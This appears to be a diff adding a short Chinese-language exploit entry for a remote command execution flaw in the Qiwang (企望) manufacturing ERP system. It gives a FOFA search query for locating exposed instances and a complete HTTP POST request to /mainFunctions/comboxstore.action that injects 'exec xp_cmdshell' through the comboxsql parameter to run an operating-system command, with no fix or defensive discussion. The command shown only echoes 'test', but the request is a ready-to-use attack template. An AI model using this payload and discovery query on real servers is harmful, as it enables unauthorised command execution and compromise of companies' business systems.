@@ -1,0 +1,20 @@
+漏洞名称
+企望制造erp系统存在远程命令执行漏洞
+
+fofa语法
+title="企望制造ERP系统"
+
+
+POC
+执行成功,响应包中存在test
+POST /mainFunctions/comboxstore.action HTTP/1.1
+Host: 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Length: 43
+comboxsql=exec%20xp_cmdshell%20'echo test'
